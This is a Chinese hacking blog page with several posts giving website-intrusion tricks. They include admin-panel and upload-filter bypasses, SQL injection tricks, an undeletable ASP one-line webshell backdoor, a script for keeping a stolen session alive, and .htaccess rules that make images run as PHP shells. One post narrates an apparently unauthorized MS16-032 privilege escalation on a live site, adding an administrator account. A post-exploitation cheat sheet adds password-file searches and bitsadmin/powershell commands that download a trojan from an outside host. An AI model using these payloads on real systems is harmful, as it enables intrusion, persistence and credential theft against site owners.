
 <!DOCTYPE HTML>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  
    <title>Bug&#39;小虫</title>
    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
    
    <meta name="author" content="小虫">
    

    
    <meta name="description" content="hark">
<meta property="og:type" content="website">
<meta property="og:title" content="Bug&#39;小虫">
<meta property="og:url" content="http://yoursite.com/page/2/index.html">
<meta property="og:site_name" content="Bug&#39;小虫">
<meta property="og:description" content="hark">
<meta property="og:locale" content="zh-CN">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Bug&#39;小虫">
<meta name="twitter:description" content="hark">

    
    <link rel="alternative" href="/atom.xml" title="Bug&#39;小虫" type="application/atom+xml">
    
    
    <link rel="icon" href="/img/favicon.ico">
    
    
    <link rel="apple-touch-icon" href="/img/jacman.jpg">
    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
    
    <link rel="stylesheet" href="/css/style.css">
</head>

  <body>
    <header>
      
<div>
		
			<div id="textlogo">
				<h1 class="site-name"><a href="/" title="Bug&#39;小虫">Bug&#39;小虫</a></h1>
				<h2 class="blog-motto">走过黑暗，前面便是光</h2>
			</div>
			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
			</a></div>
			<nav class="animated">
				<ul>
					<ul>
					 
						<li><a href="/">Home</a></li>
					
						<li><a href="/archives">Archives</a></li>
					
						<li><a href="/about">About</a></li>
					
					<li>
 					
					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
						<label>Search</label>
						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="搜索" />
						<input type="hidden" name="q" value="site:yoursite.com">
					</form>
					
					</li>
				</ul>
			</nav>			
</div>
    </header>
    <div id="container">
      <div id="main">

   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2018/02/28/渗透过程中总结的一些技巧/" title="PHP手工注入笔记" itemprop="url">PHP手工注入笔记</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
		
  <p class="article-time">
    <time datetime="2018-02-28T08:42:19.000Z" itemprop="datePublished"> 发表于 2018-02-28</time>
    
  </p>
</header>
    <div class="article-content">
        
        <p>1.利用网站过滤不严直接绕过后台验证，在网站后面加上 admin/session.asp 或 admin/left.asp</p>
<p>2.有的网站进后台会出现一个脚本提示框，输入：administrator 即可突破！因为admin代表以管理员身份进入的意思。</p>
<p>3.有的网站开了3389，入侵之前先去连接3389，尝试弱口令或是爆破，再者就是按5次shift键，看看有没前人装过后门，然后再社工密码。</p>
<p>4.有时候进后台会弹出提示框“请登陆”，把地址抄写出来（复制不了），然后放在网页源代码分析器里，选择浏览器-拦截跳转勾选–查看即可进入后台！</p>
<p>5.突破防盗链访问webshell，代码：javascript:document.write(“<a href="http://www.xxx.com/uploadfile/1.asp" target="_blank" rel="noopener">fuck</a>“)  回车后点击GO即可进入webshell</p>
<p>6.突破一流信息监控拦截系统访问，当小马可以访问，上传大马却不行的时候，可以先用大马跟一张图片合并，在上传合并后的图片，接着数据库备份后访问即可！</p>
<p>7.在拿编辑器的shell时，有时增加了asp|asa|cer|php|aspx等扩展名上传时都被过滤了，其实只要增加aaspsp 上传asp就会突破了。</p>
<p>8.有时啊D猜出表段了，但是猜不到字段的时候，可以到后台查看源文件，搜索ID或type，一般都能找到，再到啊D里添加字段进行猜解内容即可突破。</p>
<p>9.社工后台密码可以用这个技巧，假如网站域名是：<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> 管理员名称为admin，可以试试密码“baidu”和“baidu.com”来登陆。</p>
<p>10.手工注入时如果网站过滤了 and 1=1   and 1=2 ，可以用xor 1=1   xor 1=2 进行判断。</p>
<p>11.本地构造上传一句话木马，如果提示“请先选择你要上传的文件！[ 重新上传 ]” ，说明文件太小了，用记事本打开再复制多几句话从而扩大文件大小，再上传即可。</p>
<p>12.用啊d跑表，跑字段名name和pass出不来，显示长度超过50什么的，猜解不出的情况下，这时放在穿山甲去跑一般都能跑出来！</p>
<p>13.猜管理员后台小技巧，admin/left.asp、admin/main.asp、admin/top.asp、admin/admin.asp 会现出菜单导航，然后迅雷下载全部链接。</p>
<p>14.知道表名，字段，使用SQL语句在ACCESS数据库中加个用户名及密码语句：Insert into admin(user,pwd) values(‘test’,’test’)</p>
<p>15.当获得管理员密码，却拿不到管理员的帐号时，到前台随便打开一个新闻，找找诸如“提交者”“发布者”之类的字眼，一般“提交者”就是管理员的帐号了。</p>
<p>16.爆破ASP+IIS架设的网站web绝对路径，假设网站主页为：<a href="http://www.xxxxx/index.asp/" target="_blank" rel="noopener">http://www.xxxxx/index.asp/</a> 提交<a href="http://www.xxxxx.cn/fkbhvv.aspx/，fkbhvv.aspx是不存在的。" target="_blank" rel="noopener">http://www.xxxxx.cn/fkbhvv.aspx/，fkbhvv.aspx是不存在的。</a></p>
<p>17.源码的利用，很多网站用的都是网上下载的源码，有的站长很懒，什么也不改，然后就上传开通网站了，我们可以去下载一套，里面有很多默认的信息值得利用。</p>
<p>18.把以下代码上传到webshell里，后缀是asp，就算别人发现了也删除不了，算是超级防删的一句话木马了，可以很安全的留个后门，菜刀连接密码：x<br>&lt;%Eval(Request(chr(120))):Set fso=CreateObject(“Scripting.FileSystemObject”):Set f=fso.GetFile(Request.ServerVariables(“PATH_TRANSLATED”)):if  f.attributes &lt;&gt; 39 then:f.attributes = 39:end if%&gt;</p>
<p>19.当破解出帐号密码却找不到后台的时候，可以尝试链接ftp，假如域名是：<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> “ 得到的密码为“bishi”，我们就可以试下用“xxxx”“xxxx.cn”<a href="http://www.xxxx.cn作为FTP" target="_blank" rel="noopener">www.xxxx.cn作为FTP</a> 用户名，用“bishi”：作为FTP密码来进行登陆，成功的几率可以很大的哦！ftp的默认端口：21  默认帐号密码：test</p>
<p>20.有的后台不显示验证码，难道就没法登录了么? 其实把一段代码导入注册表里就可以突破这个困境了，把下面的代码保存为Code.reg，双击导入就可以了！<br>REGEDIT4<br>[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Security]<br>“BlockXBM”=dword:00000000</p>
<p>21.当网站不允许上传 asp、asa、php等文件时，我们可以上传一个stm文件，代码为“<!--#include file=”conn.asp”-->”<br>  (想查看什么文件就写什么文件名，这里我假设想查看“conn.asp”)，然后直接打开这个stm文件的地址，再查看源代码，“conn.asp”这个文件的代码就一览无遗了！</p>
<p>22.当网站不允许上传ASP,CGI,CER,CDX,HTR等类型的文件时，尝试上传一个shtm文件，内容为：<!--#includ file="conn.asp"--><br>如果上传成功，那太好了，访问地址就可以浏览conn.asp里的内容了，这样一来，数据库路径也就到手啦！</p>
<p>23.手工检测注入点弹出“你的操作已被记录!”之类的信息，访问这个文件：sqlin.asp，如果存在，在注入点后面植入一句话木马：‘excute(request(“TNT”))<br>接着用一句话木马客户端连接：<a href="http://www.xxx.com/sqlin.asp，上传木马即可拿下shell，因为很多防注入程序都是用”sqlin.asp“这个文件名来做非法记录的数据库。" target="_blank" rel="noopener">http://www.xxx.com/sqlin.asp，上传木马即可拿下shell，因为很多防注入程序都是用”sqlin.asp“这个文件名来做非法记录的数据库。</a></p>
<p>24.旁注的话，肯定是挑支持aspx的站点来日了，问题是怎样判断呢？方法很简单，在在网站后面加上xxx.aspx，如果返回“/”应用程序中的服务器错误，无法找到该资源，404画面就说明支持aspx木马。</p>
<p>25.网站后面加test.php 可以查看版本</p>
<p>26.禁忌这两个网站后台文件 admin_index.asp  manage_login.asp<br>总结：当然啦，这些还不太全，慢慢补上</p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/其他/">其他</a>
</div>


</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2018/02/27/保证session不被服务器因超时注销/" title="即可保证session不被服务器因超时注销" itemprop="url">即可保证session不被服务器因超时注销</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
		
  <p class="article-time">
    <time datetime="2018-02-27T08:42:19.000Z" itemprop="datePublished"> 发表于 2018-02-27</time>
    
  </p>
</header>
    <div class="article-content">
        
        <p>拿到服务器后很容易被服务器注销，因此我们可以用javascript来写段代码<br>使用方法:<br>拿到偷到的session登陆后,再地址栏敲入下面代码,即可保证session不被服务器因超时注销.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javascript:(function sogili() &#123;</span><br><span class="line">    setInterval(function () &#123;_ = new XMLHttpRequest || new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);_.open(&quot;GET&quot;, location);_.send(null);&#125;, 60000);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure></p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/XSS/">XSS</a>
</div>


</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2018/02/27/htaccess配合apache 提权/" title="htaccess配合apach提权" itemprop="url">htaccess配合apach提权</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
		
  <p class="article-time">
    <time datetime="2018-02-27T08:42:19.000Z" itemprop="datePublished"> 发表于 2018-02-27</time>
    
  </p>
</header>
    <div class="article-content">
        
        <p>经常会有人批量拿shell。特别是upload shell这样的漏洞。</p>
<p>拿下之后最简单的修补方法是，上传一个.</p>
<p>.HTACCESS文件到该木马，先把你的马儿转移到别的目标。</p>
<p>.HTACCESS内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;\.(php|php3|php4|php5|php6|php2)&quot;&gt;</span><br><span class="line">Deny from all</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure></p>
<p>当然这是不完善的，经过我测试，Php即可轻松绕过，可以自行添加</p>
<p>那么别人传的马儿自然无法执行了。</p>
<p>逆向思维一下，当我们拿到一个后台权限，上传PHPshell，可恨的是，他会自动把PHP这个关键词改成PHP-，</p>
<p>加一个横杠，有木有，特别是韩国站比较多见。</p>
<p>如果你运气不是那么背，环境是apache的，并且支持.HTACCESS，那么，恭喜你</p>
<p>上传一个.HTACCESS，内容是</p>
<p>AddType   application/x-httpd-php     .jpg<br>然后再传一个JPG结尾的shell，访问即可执行了</p>
<p>刚刚用到，顺手发上来了.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files demo.jpg&gt;</span><br><span class="line">ForceType application/x-httpd-php</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/Files&gt;</span><br></pre></td></tr></table></figure>
<p>这种只有是指定文件名的文件，才能被当做PHP解析.</p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/提权/">提权</a>
</div>


</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2018/01/15/MS16-032提权/" title="MS16-032提权" itemprop="url">MS16-032提权</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
		
  <p class="article-time">
    <time datetime="2018-01-15T10:37:51.000Z" itemprop="datePublished"> 发表于 2018-01-15</time>
    
  </p>
</header>
    <div class="article-content">
        
        <p>这是一个黄网的站，所以我就不打码了。如果要看我是如何GetShell的可以在我博客上看另一篇“iis7.5解析GetShell”。废话不多说了，我们开始吧！<br>PS：操作很白痴，大牛勿喷——Bug’小虫</p>
<h3 id="1-刚开始用的php一句话，发现执行不了命令"><a href="#1-刚开始用的php一句话，发现执行不了命令" class="headerlink" title="1,刚开始用的php一句话，发现执行不了命令"></a>1,刚开始用的php一句话，发现执行不了命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span></span><br></pre></td></tr></table></figure>
<p><img src="http://opgnaclz6.bkt.clouddn.com/13.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
<h3 id="2-上asp一句话，成功执行"><a href="#2-上asp一句话，成功执行" class="headerlink" title="2,上asp一句话，成功执行"></a>2,上asp一句话，成功执行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span></span><br></pre></td></tr></table></figure>
<p><img src="http://opgnaclz6.bkt.clouddn.com/14.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
<h3 id="3-systeminfo一下，发现只打了一个补丁，而且是windows2012的服务器。因此习惯性的反弹一个shll到metasploit然后用ms16-075提，但是执行了多次都反弹不回来"><a href="#3-systeminfo一下，发现只打了一个补丁，而且是windows2012的服务器。因此习惯性的反弹一个shll到metasploit然后用ms16-075提，但是执行了多次都反弹不回来" class="headerlink" title="3,systeminfo一下，发现只打了一个补丁，而且是windows2012的服务器。因此习惯性的反弹一个shll到metasploit然后用ms16-075提，但是执行了多次都反弹不回来"></a>3,systeminfo一下，发现只打了一个补丁，而且是windows2012的服务器。因此习惯性的反弹一个shll到metasploit然后用ms16-075提，但是执行了多次都反弹不回来</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8080.tmp</span><br></pre></td></tr></table></figure>
<p><img src="http://opgnaclz6.bkt.clouddn.com/15.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
<h3 id="4-上传一个ms16-032，whoami一下，成功返回SYSTEM于是直接添加账户"><a href="#4-上传一个ms16-032，whoami一下，成功返回SYSTEM于是直接添加账户" class="headerlink" title="4,上传一个ms16-032，whoami一下，成功返回SYSTEM于是直接添加账户"></a>4,上传一个ms16-032，whoami一下，成功返回SYSTEM于是直接添加账户</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">32.log <span class="string">"net user caibao Heimao123!@# /add"</span>//我把ms16-032改名为32.log了</span><br></pre></td></tr></table></figure>
<p><img src="http://opgnaclz6.bkt.clouddn.com/15.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
<h3 id="5-用户添加成功"><a href="#5-用户添加成功" class="headerlink" title="5,用户添加成功"></a>5,用户添加成功</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure>
<p><img src="http://opgnaclz6.bkt.clouddn.com/16.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
<h3 id="6-提到管理员用户组"><a href="#6-提到管理员用户组" class="headerlink" title="6,提到管理员用户组"></a>6,提到管理员用户组</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">32.log <span class="string">"net localgroup administrators caibao /add"</span></span><br></pre></td></tr></table></figure>
<p><img src="http://opgnaclz6.bkt.clouddn.com/17.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
<h3 id="7-连接远程桌面时，发现连接不上，于是应该端口被改了，因为他是外网ip"><a href="#7-连接远程桌面时，发现连接不上，于是应该端口被改了，因为他是外网ip" class="headerlink" title="7,连接远程桌面时，发现连接不上，于是应该端口被改了，因为他是外网ip"></a>7,连接远程桌面时，发现连接不上，于是应该端口被改了，因为他是外网ip</h3><p><img src="http://opgnaclz6.bkt.clouddn.com/18.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
<h3 id="8，查看一下TermService服务对应的PID，1884"><a href="#8，查看一下TermService服务对应的PID，1884" class="headerlink" title="8，查看一下TermService服务对应的PID，1884"></a>8，查看一下TermService服务对应的PID，1884</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /avc</span><br></pre></td></tr></table></figure>
<p><img src="http://opgnaclz6.bkt.clouddn.com/19.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
<h3 id="9-根据PID查找端口，果然被他改成了"><a href="#9-根据PID查找端口，果然被他改成了" class="headerlink" title="9,根据PID查找端口，果然被他改成了"></a>9,根据PID查找端口，果然被他改成了</h3><p><img src="http://opgnaclz6.bkt.clouddn.com/20.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
<h3 id="10-连接远程桌面，成功连接。把它里面黄色资源一删，走人"><a href="#10-连接远程桌面，成功连接。把它里面黄色资源一删，走人" class="headerlink" title="10,连接远程桌面，成功连接。把它里面黄色资源一删，走人"></a>10,连接远程桌面，成功连接。把它里面黄色资源一删，走人</h3><p><img src="http://opgnaclz6.bkt.clouddn.com/21.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"><br>总结：其实总体来说还是非常顺利的，主要是16-32提2012时不是很稳定，如果失败的话可以多试两次,或许有意向不到的收获。还有就是用metasploit反弹shell时失败，因为16-032不一定要反弹shell。所以没去研究。下次遇到的话可以从防火墙入手，查看端口规则，有可能端口被拦截。</p>
<h3 id="—–-Powered-by-Bug’小虫"><a href="#—–-Powered-by-Bug’小虫" class="headerlink" title="—– Powered by Bug’小虫"></a>—– Powered by Bug’小虫</h3>
        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/提权/">提权</a>
</div>


</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2018/01/15/windows提权信息收集/" title="windows提权信息收集" itemprop="url">windows提权信息收集</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
		
  <p class="article-time">
    <time datetime="2018-01-15T10:37:51.000Z" itemprop="datePublished"> 发表于 2018-01-15</time>
    
  </p>
</header>
    <div class="article-content">
        
        <h3 id="1-收集OS名称和版本信息"><a href="#1-收集OS名称和版本信息" class="headerlink" title="1. 收集OS名称和版本信息"></a>1. 收集OS名称和版本信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systeminfo | findstr /B /C:<span class="string">"OS Name"</span> /C:<span class="string">"OS Version"</span> </span><br><span class="line">systeminfo | findstr /B /C:<span class="string">"OS 名称"</span> /C:<span class="string">"OS 版本"</span></span><br></pre></td></tr></table></figure>
<h3 id="2-主机名称和所有环境变量"><a href="#2-主机名称和所有环境变量" class="headerlink" title="2. 主机名称和所有环境变量"></a>2. 主机名称和所有环境变量</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">主机名称：hostname</span><br><span class="line">环境变量：SET</span><br></pre></td></tr></table></figure>
<h3 id="3-查看用户信息"><a href="#3-查看用户信息" class="headerlink" title="3. 查看用户信息"></a>3. 查看用户信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查看所有用户：net user 或者net1 user</span><br><span class="line">查看管理员用户组：net localgroup administrators或者net1 localgroup administrators</span><br><span class="line">查看远程终端在线用户：query user 或者quser</span><br></pre></td></tr></table></figure>
<h3 id="4-查看远程端口"><a href="#4-查看远程端口" class="headerlink" title="4. 查看远程端口"></a>4. 查看远程端口</h3><p>(1)注册表查看<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">" "</span>Server\WinStations\RDP-Tcp /v PortNumber</span><br></pre></td></tr></table></figure></p>
<p>(2)通过命令行查看<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">获取对应的PID号：tasklist /svc | find <span class="string">"TermService"</span></span><br><span class="line">通过PID号查找端口：netstat -ano | find <span class="string">"1980"</span></span><br></pre></td></tr></table></figure></p>
<h3 id="5-查看网络情况"><a href="#5-查看网络情况" class="headerlink" title="5. 查看网络情况"></a>5. 查看网络情况</h3><p>(1)网络配置情况：ipconfig /all</p>
<p>(2)路由器信息： route print</p>
<p>(3)要查看ARP缓存： arp -A</p>
<p>(4)查看网络连接： netstat -ano</p>
<p>(5)要查看防火墙规则：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall show config  </span><br><span class="line">netsh firewall show state</span><br></pre></td></tr></table></figure></p>
<h3 id="6-应用程序和服务"><a href="#6-应用程序和服务" class="headerlink" title="6. 应用程序和服务"></a>6. 应用程序和服务</h3><p>(1)要查看服务的进程ID：tasklist /SVC</p>
<p>(2)已安装驱动程序的列表：DRIVERQUERY</p>
<p>(3)已经启动Windows 服务net start</p>
<p>(4)查看某服务启动权限：sc qc TermService</p>
<p>(5)已安装程序的列表：wmic product list brief</p>
<p>(6)查看服务列表：wmic service list brief # Lists services</p>
<p>(7)查看进程列表: wmic process list brief # Lists processes</p>
<p>(8)查看启动程序列表: wmic startup list brief # Lists startup items</p>
<p>(9)检查补丁已安装的更新和安装日期: wmic qfe get Caption,De**ion,HotFixID,InstalledOn<br>搜索，您可以使用提升权限的特定漏洞：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe get Caption,De**ion,HotFixID,InstalledOn | findstr  /C:<span class="string">"KBxxxxxxx"</span></span><br></pre></td></tr></table></figure></p>
<p>执行上面的命令的没有输出，意味着那个补丁未安装。</p>
<p>(10)结束程序：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process <span class="built_in">where</span> name=<span class="string">"iexplore.exe"</span> call terminate</span><br></pre></td></tr></table></figure></p>
<h3 id="7-检索敏感文件"><a href="#7-检索敏感文件" class="headerlink" title="7. 检索敏感文件"></a>7. 检索敏感文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dir /b/s password.txt </span><br><span class="line">dir /b /s *.doc </span><br><span class="line">dir /b /s *.ppt </span><br><span class="line">dir /b /s *.xls </span><br><span class="line">dir /b /s *. docx </span><br><span class="line">dir /b /s *.xlsx </span><br><span class="line">dir /b/s config.* filesystem </span><br><span class="line">findstr /si password *.xml *.ini *.txt  </span><br><span class="line">findstr /si login *.xml *.ini *.txt</span><br></pre></td></tr></table></figure>
<p>除此之外，您还可以检查无人值守安装日志文件。这些文件通常包含base64编码的密码。你更可能在大型企业中，其中单个系统的手动安装是不切实际的，找到这些文件即可获取管理员密码。这些文件的共同位置是：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\sysprep.inf</span><br><span class="line">C:\sysprep\sysprep.xml</span><br><span class="line">C:\Windows\Panther\Unattend\Unattended.xml</span><br><span class="line">C:\Windows\Panther\Unattended.xml</span><br></pre></td></tr></table></figure></p>
<h3 id="8-目录文件操作"><a href="#8-目录文件操作" class="headerlink" title="8. 目录文件操作"></a>8. 目录文件操作</h3><p>(1)列出d:\www的所有目录：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /d %i <span class="keyword">in</span> (d:\www\*) <span class="keyword">do</span> @<span class="built_in">echo</span> %i</span><br></pre></td></tr></table></figure></p>
<p>(2)把当前路径下文件夹的名字只有1-3个字母的显示出来：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /d %i <span class="keyword">in</span> (???) <span class="keyword">do</span> @<span class="built_in">echo</span> %i</span><br></pre></td></tr></table></figure></p>
<p>(3)以当前目录为搜索路径，把当前目录与下面的子目录的全部EXE文件列出：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /r %i <span class="keyword">in</span> (*.exe) <span class="keyword">do</span> @<span class="built_in">echo</span> %i</span><br></pre></td></tr></table></figure></p>
<p>(4)以指定目录为搜索路径，把当前目录与下面的子目录的所有文件列出<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /r <span class="string">"f:\freehost\hmadesign\web\" %i in (*.*) do @echo %i</span></span><br></pre></td></tr></table></figure></p>
<p>(5)显示a.txt里面的内容，因为/f的作用，会读出a.txt中：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /f %i <span class="keyword">in</span> (c:\1.txt) <span class="keyword">do</span> <span class="built_in">echo</span> %i</span><br></pre></td></tr></table></figure></p>
<h3 id="9-RAR打包"><a href="#9-RAR打包" class="headerlink" title="9. RAR打包"></a>9. RAR打包</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rar a -k -r -s -m3 c:\1.rar d:\wwwroot</span><br></pre></td></tr></table></figure>
<h3 id="10-php读文件"><a href="#10-php读文件" class="headerlink" title="10. php读文件"></a>10. php读文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:/php/php.exe <span class="string">"c:/www/admin/1.php"</span></span><br></pre></td></tr></table></figure>
<h3 id="11-Windows7及以上的版本操作系统文件下载可以使用的bitsadmin和powershell："><a href="#11-Windows7及以上的版本操作系统文件下载可以使用的bitsadmin和powershell：" class="headerlink" title="11. Windows7及以上的版本操作系统文件下载可以使用的bitsadmin和powershell："></a>11. Windows7及以上的版本操作系统文件下载可以使用的bitsadmin和powershell：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer myjob1 /download /priority normal http://www.antian365.com/lab/4433.exe c:\ma.exe </span><br><span class="line">powershell (new-object System.Net.WebClient).DownloadFile(<span class="string">' http://www.antian365.com/ma.exe'</span>,<span class="string">'ma.exe'</span>)</span><br></pre></td></tr></table></figure>
